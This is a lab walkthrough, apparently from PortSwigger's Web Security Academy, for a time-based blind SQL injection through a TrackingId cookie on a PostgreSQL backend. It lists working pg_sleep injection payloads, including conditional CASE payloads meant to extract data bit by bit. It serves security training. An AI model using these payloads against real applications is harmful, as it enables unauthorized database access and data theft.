## Blind SQL injection with time delays

**Category:** sqli
**Difficulty:** Medium

### Description
This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

### Solution Steps
1. Identify the injection point in the TrackingId cookie
2. No visible response difference - test for time-based blind injection
3. The database is PostgreSQL - use pg_sleep() for delays
4. Craft a payload that causes a measurable time delay: `TrackingId=x'||pg_sleep(10)--`
5. Send the request and measure response time
6. If the response takes ~10 seconds longer, time-based injection is confirmed
7. You can use this to extract data by combining with conditions:
8. `x'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END)--` - 10s delay
9. `x'||(SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END)--` - no delay
10. The time difference confirms whether conditions are true or false

### Key Payloads
- `TrackingId`
- `pg_sleep(10)`
- `TrackingId=x'||pg_sleep(10)--`
- `x';SELECT pg_sleep(10)--`
- `x'||(SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END)--`

### Indicators of Success
- Response time increases by ~10 seconds with delay payload
- Consistent delay confirms injection
- Time difference measurable between true/false conditions
- PostgreSQL pg_sleep function executes successfully

---
*Source: PortSwigger Web Security Academy*
